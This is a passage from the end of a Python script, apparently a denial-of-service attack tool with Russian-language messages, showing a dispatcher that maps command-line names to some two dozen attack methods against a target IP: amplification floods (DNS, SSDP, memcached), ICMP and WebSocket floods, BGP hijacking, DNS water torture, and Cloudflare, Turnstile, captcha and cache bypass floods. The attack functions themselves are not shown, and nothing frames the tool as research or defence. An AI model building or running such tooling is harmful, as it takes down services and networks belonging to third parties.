                'udpfuzzing': (attacker.udp_protocol_fuzzing, (target_ip, args.port, args.duration)),
                'dns': (attacker.dns_attack, (target_ip, args.duration)),
                'ssdp': (attacker.ssdp_amplification_attack, (target_ip, args.duration)),
                'icmp': (attacker.icmp_flood_attack, (target_ip, args.duration)),
                'blackhole': (attacker.blackhole_attack, (target_ip, args.duration)),
                'bgp': (attacker.bgp_hijacking_blackhole_routing, (target_ip, args.duration)),
                'ipfragment': (attacker.ip_fragment_storm, (target_ip, args.duration)), 
                'cpu': (attacker.router_cpu_targeted_attack, (target_ip, args.duration)),
                'gre': (attacker.gre_tunnel_exhaustion, (target_ip, args.duration)),   
                'isp': (attacker.isp_flood, (target_ip, args.duration)),
                'bras': (attacker.bras_attack, (target_ip, args.duration)),
                'dnsinfra': (attacker.dns_infrastructure_attack, (target_ip, args.duration)),
                'memcached': (attacker.memcached_amplification_attack, (target_ip, args.duration)),
                'cloudflare': (attacker.advanced_cloudflare_bypass, (target_ip, args.port, args.duration)),
                'cfturnstile': (attacker.http_flood_with_turnstile_bypass, (target_ip, args.port, args.duration)),
                'cfturnstile2': (attacker.advanced_turnstile_bypass_attack, (target_ip, args.port, args.duration)),
                'jscf': (attacker.advanced_cloudflare_bypass_v2, (target_ip, args.port, args.duration)),
                'captchabypass': (attacker.http_flood_with_captcha_bypass, (target_ip, args.port, False, args.duration)),
                'cachebypass': (attacker.cache_bypass_attack, (target_ip, args.port, False, args.duration)),
                'cachebypass2': (attacker.advanced_cache_bypass_attack, (target_ip, args.port, False, args.duration)),
                'headerinjection': (attacker.host_header_injection_attack, (target_ip, args.port, args.duration//10)),
                'websocket': (attacker.websocket_flood, (target_ip, args.port, args.duration)),
                'websocketbomb': (attacker.websocket_memory_exhaustion_attack, (target_ip, args.port, args.duration)),
                'randomport': (attacker.randomized_port_attack, (target_ip, args.duration)),
                'dnstorture': (attacker.dns_water_torture_attack, (target_ip, args.duration)),
                'dnsnxdomain': (attacker.dns_nxdomain_attack, (target_ip, args.duration)),
                'dnssubdomain': (attacker.dns_subdomain_attack, (target_ip, args.duration)),     
            }

            
            if args.attack_type in attack_map:
                attack_func, attack_args = attack_map[args.attack_type]
                attack_func(*attack_args)
            else:
                print(f"❌ Неизвестный тип атаки: {args.attack_type}")
                
    except KeyboardInterrupt:
        print("\n⏹️  Атака прервана пользователем")
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")
    
    total_time = time.time() - start_time
    print(f"\n✅ Все атаки завершены за {total_time:.2f} секунд")

if __name__ == "__main__":
    main()